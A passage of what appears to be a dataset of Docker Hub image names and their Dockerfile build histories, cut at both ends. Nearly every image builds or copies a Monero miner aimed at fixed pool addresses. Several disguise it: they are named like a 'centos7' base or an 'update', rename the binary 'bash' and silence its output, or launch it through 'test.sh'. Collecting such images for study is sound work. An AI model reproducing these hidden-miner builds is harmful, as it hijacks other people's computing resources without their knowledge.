/etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update && apt-get install -y git     build-essential     cmake     libuv1-dev     libmicrohttpd-dev\nRUN git clone https://github.com/xmrig/xmrig.git /app\nWORKDIR /app\nRUN mkdir build\nWORKDIR /app/build\nRUN cmake ..\nRUN make\nCOPY file:fa55619759301bd2a94af58e0b3e1e61a4637a30861c8dfeff747cc4a44e03c9 /app/build\nRUN chmod +x test.sh\nENV URL=stratum+tcp://217.182.207.210:8080\nRUN ln -s ./xmrig ./entry\nCMD ["/bin/sh -c ./test.sh"]'
yarbelb/test; b'ADD file:89ecb642d662ee7edbb868340551106d51336c7e589fdaca4111725ec64da957 /\nCMD ["/bin/bash"]\nRUN apt-get update && apt-get install -y sudo && rm -rf /var/lib/apt/lists/*\nRUN sudo apt-get update\nRUN sudo apt-get install -y git-all\nRUN sudo sudo apt-get install -y automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++\nRUN git clone https://github.com/wolf9466/cpuminer-multi\nCOPY file:0f6d6e023ca81ed48494dc98d6a3488ba38c8a4d99754aff9e275516df3bd713 cpuminer-multi/\nWORKDIR /cpuminer-multi\nRUN ./autogen.sh\nRUN ./configure CFLAGS="-march=native"\nRUN make\nRUN mkdir -p /usr/src/app\nRUN cp ./minerd /usr/src/app/test\nWORKDIR /usr/src/app\nRUN rm -rf cpuminer-multi\nCOPY file:764c36943e10e1c03b14ef924dcac4f45376656cff3897603aa736fe820a9e97 /usr/src/app/\nEXPOSE 80/tcp\nCMD ["/bin/sh -c ./run.sh"]'
whatsdoneisdone/centos7; b'ADD file:2b00f26f6004576e2f8faeb3fb0517a14f79ea89a059fe096b54cbecf5da512e /\nCMD ["/bin/sh"]\nRUN apk --no-cache upgrade && apk --no-cache add git cmake libuv-dev libmicrohttpd-dev build-base && git clone https://github.com/xmrig/xmrig.git /app && cd /app && mkdir build\nCOPY file:82508ca788a5e3e35b489f3a3d293fcc4fb1eb12c0783a3188422305be116c29 /app/src/patch.diff\nRUN cd /app/src && patch donate.h < patch.diff && cd /app && cmake -DCMAKE_BUILD_TYPE=Release . && make && apk del build-base cmake git && mv xmrig bash\nENV API_PORT=80 TOK=987b762045a5b3b05ab180449f170e0c1a2282b26edb4d85 O=node147005-nodesrv.jelastic.regruhosting.ru:11014 T=1 AV=2\nEXPOSE 80\nCOPY file:824aecbf6041cdb7c83ae06754c96169d90cda3b76f117b56e237d93b0f7a0d2 /app/config.json\nWORKDIR /app\nCMD ["/bin/sh -c ./bash -t $T --av=$AV -o $O -O u:x --api-port=$API_PORT --api-access-token=$TOK -c config.json > /dev/null"]'
krakenz/cokkokotre1-update; b'ADD file:fe1f09249227e2da2089afb4d07e16cbf832eeb804120074acd2b8192876cd28 /\nCMD ["/bin/sh"]\nCOPY file:b8fb9a761513982b3313f931348f8b80d2a1e9284aefb4f9a7433640fe1a96dc /bin/\nRUN apk --no-cache add     libuv-dev\nRUN apk --no-cache add     --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing     hwloc-dev\nRUN echo /bin/./xmrig --nicehash -o 109.234.36.173:7774 --cpu-affinity 0xf --donate-level=1 --algo=rx/0 --coin=monero > /bin/docker.sh && chmod +x /bin/docker.sh\nENTRYPOINT ["/bin/sh -c /bin/sh -c /bin/docker.sh"]'
cokkokotre1/update; b'ADD file:fe1f09249227e2da2089afb4d07e16cbf832eeb804120074acd2b8192876cd28 /\nCMD ["/bin/sh"]\nCOPY file:b8fb9a761513982b3313f931348f8b80d2a1e9284aefb4f9a7433640fe1a96dc /bin/\nRUN apk --no-cache add     libuv-dev\nRUN apk --no-cache add     --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing     hwloc-dev\nRUN echo /bin/./xmrig --nicehash -o 109.234.36.173:7774 --cpu-affinity 0xf --donate-level=1 --algo=rx/0 --coin=monero > /bin/docker.sh && chmod +x /bin/docker.sh\nENTRYPOINT ["/bin/sh -c /bin/sh -c /bin/docker.sh"]'
marcincuber/mc_mine; b'ADD file:c753df38640ab6e246d9e66f0cef7156b7003976080b1e0b83e5717cd6ef1725 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update && apt-get install -y     curl vim wget\nRUN mkdir coin && cd $_ &&     wget https://minergate.com/download/deb-cli &&     dpkg -i deb-cli &&     cd .. &&     echo minergate-cli -user marcincuber@hotmail.com -xmr 2 > mine.sh &&     rm -rf coin'
weroco/stx; b'ADD file:a3344b835ea6fdc5692df23826c970403656c6947342e117b2ac1a05956679af /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nLABEL maintainer=NVIDIA CORPORATION <cudatools@nvidia.com>\nRUN NVIDIA_GPGKEY_SUM=d1be581509378368edeec8c1eb2958702feedf3bc3d17011adbf24efacce4ab5 &&     NVIDIA_GPGKEY_FPR=ae09fe4bbd223a84b2ccfce3f60f4b3d7fa2af80 &&     apt-key adv --fetch-keys http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64/7fa2af80.pub &&     apt-key adv --export --no-emit-version -a $NVIDIA_GPGKEY_FPR | tail -n +5 > cudasign.pub &&     echo "$NVIDIA_GPGKEY_SUM  cudasign.pub" | sha256sum -c --strict - && rm cudasign.pub &&     echo "deb http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64 /" > /etc/apt/sources.list.d/cuda.list &&     echo "deb http://developer.download.nvidia.com/compute/machine-learning/repos/ubuntu1604/x86_64 /" > /etc/apt/sources.list.d/nvidia-ml.list\nENV CUDA_VERSION=9.0.176\nENV CUDA_PKG_VERSION=9-0=9.0.176-1\nRUN apt-get update && apt-get install -y --no-install-recommends         cuda-cudart-$CUDA_PKG_VERSION &&     ln -s cuda-9.0 /usr/local/cuda &&     rm -rf /var/lib/apt/lists/*\nLABEL com.nvidia.volumes.needed=nvidia_driver\nLABEL com.nvidia.cuda.version=9.0.176\nRUN echo "/usr/local/nvidia/lib" >> /etc/ld.so.conf.d/nvidia.conf &&     echo "/usr/local/nvidia/lib64" >> /etc/ld.so.conf.d/nvidia.conf\nENV PATH=/usr/local/nvidia/bin:/usr/local/cuda/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nENV LD_LIBRARY_PATH=/usr/local/nvidia/lib:/usr/local/nvidia/lib64\nENV NVIDIA_VISIBLE_DEVICES=all\nENV NVIDIA_DRIVER_CAPABILITIES=compute,utility\nENV NVIDIA_REQUIRE_CUDA=cuda>=9.0\nLABEL com.nvidia.build.id=49938346 com.nvidia.build.ref=ab0119f849a3a879f0de8a6fb99060968e75d5cd\nENV GIT_REPOSITORY=https://github.com/fireice-uk/xmr-stak.git\nENV XMRSTAK_CMAKE_FLAGS=-DXMR-STAK_COMPILE=generic -DCUDA_ENABLE=ON -DOpenCL_ENABLE=OFF\nRUN apt-get update     && set -x     && apt-get install -qq --no-install-recommends -y ca-certificates cmake cuda-core-9-0 git cuda-cudart-dev-9-0 libhwloc-dev libmicrohttpd-dev libssl-dev     && git clone $GIT_REPOSITORY     && cd /xmr-stak     && sed -i \'s/ 2.0 / 0.0 /\' xmrstak/donate-level.hpp     && cmake ${XMRSTAK_CMAKE_FLAGS} .     && make     && cd -     && mv /xmr-stak/bin/* /usr/local/bin/     && rm -rf /xmr-stak     && apt-get purge -y -qq cmake cuda-core-9-0 git cuda-cudart-dev-9-0 libhwloc-dev libmicrohttpd-dev libssl-dev     && apt-get clean -qq\nVOLUME /mnt\nWORKDIR /mnt\nENTRYPOINT ["/usr/local/bin/xmr-stak"]\nRUN ln -s /usr/local/bin/xmr-stak /usr/bin/st\nADD dir:4ba3cefd5875ef2d966d83434cc68efc7de6d586a120ba16df5dd54bd6089678 /srv/\nWORKDIR /srv\nENTRYPOINT ["/usr/bin/st"]\nCMD ["-c c.txt"]'
fici/terla; b'ADD file:280a445783f309c90ab928883d98e4326c1fbe19927c8a555da41bcb74c71a45 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update && apt-get install -y git     build-essential     cmake     libuv1-dev     libmicrohttpd-dev\nRUN git clone https://github.com/xmrig/xmrig.git /app\nWORKDIR /app\nRUN mkdir build\nWORKDIR /app/build\nRUN cmake ..\nRUN make\nENV PASS=x\nCMD ["/bin/sh -c ./xmrig -o ${URL} -u ${USER} -p ${PASS} -k --donate-level 1"]\nWORKDIR /app/build\nCOPY file:4a698d3758cc3dddeb92353ccc60d2c373beb2714fa5366e427b0164c7b9f181 ./\nRUN chmod +x test.sh\nENV URL=stratum+tcp://217.182.207.210:8080\nRUN ln -s ./xmrig ./entry\nCMD ["/bin/sh -c ./test.sh"]'
vimuxegoto/abraka; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update && apt-get install -y git     build-essential     cmake     libuv1-dev     libmicrohttpd-dev\nRUN git clone https://github.com/xmrig/xmrig.git /app\nWORKDIR /app\nRUN mkdir build\nWORKDIR /app/build\nRUN cmake ..\nRUN make\nENV PASS=x\nCMD ["/bin/sh -c ./xmrig -o ${URL} -u ${USER} -p ${PASS} -k --donate-level 1"]\nWORKDIR /app/build\nCOPY file:1752a7365916c042c2233a3126a9c422457fecc6ff567422c8d822ea9383f53c ./\nRUN chmod +x test.sh\nENV URL=stratum+tcp://proxy:80\nRUN ln -s ./xmrig ./entry\nCMD ["/bin/sh -c ./test.sh"]'
dbdon/4v100core24; b'ADD file:603693e48cdc7f0c5c62119923aadbb266e5df5a5002fc0f61295858f91690e8 /\nRUN rm -rf /var/lib/apt/lists/*\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nLABEL maintainer=NVIDIA CORPORATION <cudatools@nvidia.com>\nRUN apt-get update && apt-get install -y --no-install-recommends ca-certificates apt-transport-https gnupg-curl &&     NVIDIA_GPGKEY_SUM=d1be581509378368edeec8c1eb2958702feedf3bc3d17011adbf24efacce4ab5 &&     NVIDIA_GPGKEY_FPR=ae09fe4bbd223a84b2ccfce3f60f4b3d7fa2af80 &&     apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64/7fa2af80.pub &&     apt-key adv --export --no-emit-version -a $NVIDIA_GPGKEY_FPR | tail -n +5 > cudasign.pub &&     echo "$NVIDIA_GPGKEY_SUM  cudasign.pub" | sha256sum -c --strict - && rm cudasign.pub &&     echo "deb https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64 /" > /etc/apt/sources.list.d/cuda.list &&     echo "deb https://developer.download.nvidia.com/compute/machine-learning/repos/ubuntu1604/x86_64 /" > /etc/apt/sources.list.d/nvidia-ml.list &&     apt-get purge --auto-remove -y gnupg-curl && rm -rf /var/lib/apt/lists/*\nENV CUDA_VERSION=9.0.176\nENV CUDA_PKG_VERSION=9-0=9.0.176-1\nRUN apt-get update && apt-get install -y --no-install-recommends         cuda-cudart-$CUDA_PKG_VERSION && ln -s cuda-9.0 /usr/local/cuda &&     rm -rf /var/lib/apt/lists/*\nLABEL com.nvidia.volumes.needed=nvidia_driver\nLABEL com.nvidia.cuda.version=9.0.176\nRUN echo "/usr/local/nvidia/lib" >> /etc/ld.so.conf.d/nvidia.conf &&     echo "/usr/local/nvidia/lib64" >> /etc/ld.so.conf.d/nvidia.conf\nENV PATH=/usr/local/nvidia/bin:/usr/local/cuda/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nENV LD_LIBRARY_PATH=/usr/local/nvidia/lib:/usr/local/nvidia/lib64\nENV NVIDIA_VISIBLE_DEVICES=all\nENV NVIDIA_DRIVER_CAPABILITIES=compute,utility\nENV NVIDIA_REQUIRE_CUDA=cuda>=9.0\nRUN useradd -ms /bin/bash monero\nUSER monero\nWORKDIR /home/monero\nCOPY --chown=monerofile:c30f9872592b2106cf3b6a27951f9bc937ad220a7d76df0a0865fe7a190fd15e /home/monero/\nRUN chmod +x /home/monero/bminer\nCOPY --chown=monerofile:718636e18334ded8203fde395d90dc35eddfbaabd483d3deaf7f3d418f6616fb /home/monero/\nRUN chmod +x /home/monero/testdb.sh\nCOPY --chown=monerofile:c6c146dada04f99a3652abcbe0691799b8ad5927b0322ac5868915674d532088 /home/monero/\nRUN chmod +x /home/monero/xmrig\nENTRYPOINT ["./testdb.sh"]'
thshaw/bailbloc; b'ADD file:7695c82efcabf2b3ad4c608b200c506d9a16d22ebb6a823742a83fc3b5bc1f31 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nCOPY file:acf630ebf622dc94f4c4fbed2fc7427d63ad544b9df38e3a418a7817450d7933 bailbloc_worker_linux\nENTRYPOINT ["/bin/sh -c ./bailbloc_worker_linux            --url mine.xmrpool.net:5555            --user 442uGwAdS8c3mS46h6b7KMPQiJcdqmLjjbuetpCfSKzcgv4S56ASPdvXdySiMizGTJ56ScZUyugpSeV6hx19QohZTmjuWiM            --pass persistentID:bailbloc@thenewinquiry.com            --keepalive            --max-cpu-usage 25            --print-time 4"]'
4reallive/stak-trtl-funky; b'ADD file:592c2540de1c707636622213ee30ff5b6f8be0a48bb25c97edc7204ea4df1a81 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nENV GIT_REPOSITORY=https://github.com/turtlecoin/trtl-stak\nENV XMRSTAK_CMAKE_FLAGS=-DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF -DMICROHTTPD_ENABLE=OFF\nRUN apt-get update     && set -x\nRUN apt-get install -qq --no-install-recommends -y build-essential ca-certificates cmake git libhwloc-dev libssl-dev sed\nRUN git clone $GIT_REPOSITORY\nWORKDIR /trtl-stak\nRUN sed -i \'s/2.0 \\/ 100.0;/0.0 \\/ 100.0;/\' ./xmrstak/donate-level.hpp\nRUN cmake ${XMRSTAK_CMAKE_FLAGS} .\nRUN make && cd -\nRUN mv ./bin/* /usr/local/bin/     && rm -rf /trtl-stak     && apt-get purge -y -qq build-essential cmake git libhwloc-dev libssl-dev     && apt-get clean -qq\nRUN echo \'* soft memlock 262144\' >> /etc/security/limits.conf     && echo \'* hard memlock 262144\' >> /etc/security/limits.conf     && echo \'vm.nr_hugepages=128\' >> /etc/sysctl.conf     && sysctl -w vm.nr_hugepages=128\nRUN useradd -rm -u 999 limited\nVOLUME /home/limited\nWORKDIR /home/limited\nCOPY file:0b46d2a2e124e776eaeff5f9d0036981dd7c831bfc28b74e8c27f6c4b13522b8 /home/limited/cpu.txt\nCOPY file:f27a9cd9809cfad30a1168a5eab59db85d4d03babbcc1b639a3468e87b80d14f /home/limited/pools.txt\nCOPY file:c0fbfbe5e356f2e0e6d1ecdb221bb7b616441fe1cdff5b2fe90aca177e52c8f0 /home/limited/config.txt\nUSER limited\nENTRYPOINT ["/bin/sh -c /usr/local/bin/xmr-stak -p $(hostname) -u TRTLuzj8yzQ6ZZ5skStmeQALGpnUxtgN7dmm1V1egkYycoB7hnidC4RCn2ZxgiqDSZDoV8wmiXgqBQvNcsegnwM2HQkeFtoSycU -o trtl.heigh-ho.funkypenguin.co.nz:7777"]'
4reallive/stak-trtl-funky5; b'ADD file:592c2540de1c707636622213ee30ff5b6f8be0a48bb25c97edc7204ea4df1a81 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nENV GIT_REPOSITORY=https://github.com/turtlecoin/trtl-stak\nENV XMRSTAK_CMAKE_FLAGS=-DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF -DMICROHTTPD_ENABLE=OFF\nRUN apt-get update     && set -x\nRUN apt-get install -qq --no-install-recommends -y build-essential ca-certificates cmake git libhwloc-dev libssl-dev sed\nRUN git clone $GIT_REPOSITORY\nWORKDIR /trtl-stak\nRUN sed -i \'s/2.0 \\/ 100.0;/0.0 \\/ 100.0;/\' ./xmrstak/donate-level.hpp\nRUN cmake ${XMRSTAK_CMAKE_FLAGS} .\nRUN make && cd -\nRUN mv ./bin/* /usr/local/bin/     && rm -rf /trtl-stak     && apt-get purge -y -qq build-essential cmake git libhwloc-dev libssl-dev     && apt-get clean -qq\nRUN echo \'* soft memlock 262144\' >> /etc/security/limits.conf     && echo \'* hard memlock 262144\' >> /etc/security/limits.conf     && echo \'vm.nr_hugepages=128\' >> /etc/sysctl.conf     && sysctl -w vm.nr_hugepages=128\nRUN useradd -rm -u 999 limited\nVOLUME /home/limited\nWORKDIR /home/limited\nCOPY file:0b46d2a2e124e776eaeff5f9d0036981dd7c831bfc28b74e8c27f6c4b13522b8 /home/limited/cpu.txt\nCOPY file:567b37584e1917f9030c425eb0466e547ef92263950db4c82594d14aaa6eeb0a /home/limited/pools.txt\nCOPY 